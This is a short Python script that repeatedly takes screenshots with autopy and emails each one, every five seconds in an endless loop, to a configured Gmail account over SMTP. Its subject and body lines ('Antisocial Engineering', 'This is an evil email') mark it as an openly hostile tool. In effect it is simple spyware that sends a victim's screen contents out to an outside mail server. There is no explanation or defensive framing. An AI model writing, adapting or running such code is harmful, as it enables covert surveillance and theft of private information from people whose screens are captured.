#!/usr/bin/python

import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email import Encoders
import os
import time

gmail_user =''
gmail_pwd =''



def mail(to, subject, text, attach):

   
   import autopy

   bitmap = autopy.bitmap.capture_screen()
   bitmap.save('C:\screenshot.png')

   msg = MIMEMultipart()
   msg['From'] = gmail_user
   msg['To'] = gmail_user
   msg['Subject'] = subject

   msg.attach(MIMEText(text))

   part = MIMEBase('application', 'octet-stream')
   part.set_payload(open(attach, 'rb').read())
   Encoders.encode_base64(part)
   part.add_header('Content-Disposition',
           'attachment; filename="%s"' % os.path.basename(attach))
   msg.attach(part)

   mailServer = smtplib.SMTP("smtp.gmail.com", 587)
   mailServer.ehlo()
   mailServer.starttls()
   mailServer.ehlo()
   mailServer.login(gmail_user, gmail_pwd)
   mailServer.sendmail(gmail_user,gmail_user, msg.as_string())
   # Should be mailServer.quit(), but that crashes...
   mailServer.close()

def main():
      while True:
         
         mail("some.person@some.address.com",
         "Antisocial Engineering",
         "This is an evil email",
         "C:\screenshot.png")
         time.sleep(5)

if __name__=='__main__':
    main()
